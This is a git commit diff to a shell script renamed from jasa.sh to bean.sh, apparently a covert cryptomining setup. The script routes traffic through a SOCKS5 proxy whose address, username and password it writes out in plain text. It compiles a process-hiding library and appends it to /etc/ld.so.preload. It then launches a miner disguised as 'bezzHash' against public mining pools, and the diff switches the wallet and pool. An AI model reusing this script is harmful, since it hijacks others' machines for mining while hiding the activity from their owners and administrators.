6c42336304b83c9d9130ce6cf5df1649b721553b
mfqh00 <90943340+mfqh00@users.noreply.github.com>
2022-11-23 23:26:41 +0800

    Update and rename jasa.sh to bean.sh

--- bean.sh
+++ bean.sh
@@ -8,9 +8,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.155.69.201:6406
-socks5_username = ingfoingfo
-socks5_password = maszZeehh
+socks5 = 144.168.217.88:8780
+socks5_username = wmbxigws
+socks5_password = rgtz2wi12ft4
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -42,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=TRTLuzPogmdd7fUhzfhNnxNUDVjgJCChGRz96sTiqJTbEV137nTdeWgWCREB1g6DSY658CALoYGYMRoXXCYn4QhPc6qQGf7Srw6.$(echo $(shuf -i 1-99999 -n 1)-T4)@pool.hashvault.pro:80 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=bc1qlcq84vz9ctc5aphm4y2t0w4l5at8u9xp5g0v6l.$(echo $(shuf -i 1-99999 -n 1)-T4)@beamv3.auto.nicehash.com:9200 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
